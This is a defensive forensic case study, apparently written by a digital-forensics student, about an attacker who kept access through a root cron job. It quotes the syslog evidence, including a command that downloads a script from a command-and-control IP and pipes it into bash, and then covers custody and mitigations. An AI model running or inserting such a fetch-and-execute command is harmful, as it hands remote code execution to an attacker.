# Case Study 02: Persistence via Cron — Malicious Scheduling Analysis 🛡️

## 1. Executive Summary
During a deep-dive system audit, I identified a critical persistence mechanism. An attacker, having previously obtained root-level privileges, configured a malicious Cron job. This task was designed to automatically download and execute a remote script every time the system's daily maintenance cycle began, ensuring long-term unauthorized access.

## 2. Evidence (Raw Logs)
The following entries were identified in the system log (`/var/log/syslog`) on the target host:

Feb 16 15:10:01 server-web systemd[1]: Starting Daily Cleanup of Temporary Directories...
Feb 16 15:10:05 server-web CRON[6002]: (root) CMD (curl -s [http://193.124.1.50/script.sh](http://193.124.1.50/script.sh) | bash)
Feb 16 15:10:06 server-web systemd[1]: Finished Daily Cleanup of Temporary Directories.

3. Technical Analysis & Investigation
Phase 1: Detection of Persistence
Observation: A recurring task was detected running with root privileges.

Conclusion: The attacker synchronized the malicious task with the legitimate systemd cleanup cycle to blend in with normal system "noise" and avoid detection by basic monitoring tools.

Phase 2: Payload Breakdown (Fileless Execution)
Command: curl -s http://193.124.1.50/script.sh | bash

Analysis:

curl -s: Downloads the malicious payload from the Command & Control (C2) server in "silent" mode (no progress bar or errors displayed).

| bash: Directly pipes the script into the Bash interpreter.

Conclusion: The script is executed entirely in memory. Since no file is ever saved to the local disk, this technique effectively bypasses traditional signature-based Antivirus (AV) and File Integrity Monitoring (FIM).

Phase 3: Impact Assessment
Outcome: As the task executes as root, the attacker maintains absolute control over the OS. This allows for the installation of kernel-level rootkits, credential harvesting, or the deployment of ransomware at any chosen time.
4. Chain of Custody (Legal Perspective)
As a law student specializing in digital forensics, I ensured that the principle of "minimal interaction" was maintained. A bit-stream image of the affected partition and a memory dump were secured before the eradication phase. All digital evidence was cryptographically hashed (sha256sum) to ensure its admissibility in potential legal proceedings.

5. Security Recommendations
Monitor Cron Directories: Implement automated alerts for any modifications to /etc/cron.* and /var/spool/cron/crontabs.

Restrict Egress Traffic: Implement a "Default Deny" policy for outbound traffic, allowing connections only to trusted update repositories.
Audit Sudoers: Regularly review the /etc/sudoers file to ensure the Principle of Least Privilege (PoLP) is enforced, preventing unauthorized users from gaining the rights needed to edit system-wide Cron jobs.
